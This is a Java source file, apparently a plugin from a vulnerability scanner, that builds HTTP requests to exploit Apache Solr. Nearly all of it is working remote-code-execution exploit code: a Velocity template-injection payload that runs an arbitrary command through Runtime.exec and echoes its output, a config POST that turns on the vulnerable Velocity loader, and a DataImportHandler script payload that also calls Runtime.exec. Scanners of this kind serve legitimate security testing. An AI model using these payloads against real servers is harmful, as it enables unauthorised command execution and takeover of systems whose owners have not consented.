package com.gbw.scanner.plugins.scripts.web.solr;

import com.xmap.api.utils.TextUtils;

import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpRequest;
import java.nio.charset.Charset;
import java.time.Duration;

public class SolrHttpRequestBuilder {

    private static final String solrAdminCoreURL = "/solr/admin/cores";
    private static final String solrConfigURL = "/solr/admin/file/?contentType=text/xml;charset=utf-8&file=solrconfig.xml";
    private static final String UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36";
    private static final String velConfigJson = "{\n" +
            "  \"update-queryresponsewriter\": {\n" +
            "    \"startup\": \"lazy\",\n" +
            "    \"name\": \"velocity\",\n" +
            "    \"class\": \"solr.VelocityResponseWriter\",\n" +
            "    \"template.base.dir\": \"\",\n" +
            "    \"solr.resource.loader.enabled\": \"true\",\n" +
            "    \"params.resource.loader.enabled\": \"true\"\n" +
            "  }\n" +
            "}";

    private static final String payloadBefore =
            "q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))" +
            "+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23" +
            "set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27";

    public static final String payloadAfter = "%27))" +
            "+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end";


    public static String makePayload(String cmd,String core,boolean isEncode){

        StringBuffer sb = new StringBuffer("/solr");
        if(isEncode)
            cmd = URLEncoder.encode(cmd, Charset.forName("UTF-8"));

        if(TextUtils.isEmpty(core))
            sb.append("/select?");
        else
            sb.append(String.format("/%s/select?",core));

        sb.append(payloadBefore);
        sb.append(cmd);
        sb.append(payloadAfter);

        return sb.toString();
    }

    public static String makeDataImportPayload(String cmd,boolean isEncode){

        if(isEncode)
            cmd = URLEncoder.encode(cmd, Charset.forName("UTF-8"));

        String payload = "command=full-import&verbose=false&clean=true&commit=true&debug=true&core=atom&" +
                "dataConfig=%%3CdataConfig%%3E%%0A++%%3CdataSource+type%%3D%%22URLDataSource%%22%%2F%%3E%%0A++%%3Cscript%%3E%%3C!%%5BCDATA%%5B%%0A++++++++++" +
                "function+poc()%%7B+java.lang.Runtime.getRuntime().exec(%%22" +cmd+
                "%%22)%%3B%%0A" +
                "++++++++++%%7D%%0A++%%5D%%5D%%3E%%3C%%2Fscript%%3E%%0A++%%3Cdocument%%3E%%0A++++%%3Centity+name%%3D%%22stackoverflow%%22%%0A++++++++++++" +
                "url%%3D%%22https%%3A%%2F%%2Fstackoverflow.com%%2Ffeeds%%2Ftag%%2Fsolr%%22%%0A++++++++++++processor%%3D%%22XPathEntityProcessor%%22%%0A++++++++++++" +
                "forEach%%3D%%22%%2Ffeed%%22%%0A++++++++++++transformer%%3D%%22script%%3Apoc%%22+%%2F%%3E%%0A++%%3C%%2Fdocument%%3E%%0A%%3C%%2FdataConfig%%3E&name=dataimport";

        return payload;
    }

    public static HttpRequest makeSolrCoreAdminRequest(String host,int port,int timeout){

        String uri = String.format("http://%s:%d%s?wt=json",host,port,solrAdminCoreURL);

        HttpRequest.Builder builder = HttpRequest.newBuilder()
                .timeout(Duration.ofMillis(timeout))
                .header("User-Agent",UA)
                .GET()
                .uri(URI.create(uri));

        return builder.build();
    }

    public static HttpRequest makeSolrCoreConfigRequest(String host, int port, String core, int timeout){

        String uri;

        if(TextUtils.isEmpty(core))
            uri = String.format("http://%s:%d%s",host,port,solrConfigURL);
        else
            uri = String.format("http://%s:%d/solr/%s/config?wt=json",host,port,core);

        HttpRequest.Builder builder = HttpRequest.newBuilder()
                .timeout(Duration.ofMillis(timeout))
                .header("User-Agent",UA)
                .GET()
                .uri(URI.create(uri));

        return builder.build();
    }

    public static HttpRequest makeSolrCoreConfigPostRequest(String host,int port,String core,int timeout){

        String uri;

        if(TextUtils.isEmpty(core))
            uri = String.format("http://%s:%d%s",host,port,solrConfigURL);
        else
            uri = String.format("http://%s:%d/solr/%s/config?wt=json",host,port,core);

        HttpRequest.Builder builder = HttpRequest.newBuilder()
                .timeout(Duration.ofMillis(timeout))
                .header("User-Agent",UA)
                .header("Content-Type","application/json")
                .POST(HttpRequest.BodyPublishers.ofString(velConfigJson))
                .uri(URI.create(uri));

        return builder.build();
    }

    public static HttpRequest makeSolrCoreAttackRequest(String host,int port,String core,String cmd,boolean isEncode,int timeout){

        String uri = String.format("http://%s:%d%s",host,port,makePayload(cmd,core,isEncode));

        HttpRequest.Builder builder = HttpRequest.newBuilder()
                .timeout(Duration.ofMillis(timeout))
                .header("User-Agent",UA)
                .GET()
                .uri(URI.create(uri));

        return builder.build();
    }

    public static HttpRequest makeSolrDataimportPocRequest(String host,int port,String core,String cmd,boolean isEncode,int timeout){

        if(TextUtils.isEmpty(core))
            core = "collection1";

        String uri = String.format("http:%s:%d/solr/%s/dataimport?wt=json",host,port,core);
        String payload = makeDataImportPayload(cmd,isEncode);
        String refer = String.format("http:%s:%d/solr/",host,port);

        HttpRequest.Builder builder = HttpRequest.newBuilder()
                .timeout(Duration.ofMillis(timeout))
                .header("User-Agent",UA)
                .header("Content-Type","application/x-www-form-urlencoded")
                .header("Accept","application/json, text/plain, */*")
                .header("X-Requested-With","XMLHttpRequest")
                .header("Referer",refer)
                .POST(HttpRequest.BodyPublishers.ofString(payload))
                .uri(URI.create(uri));

        return builder.build();
    }

}
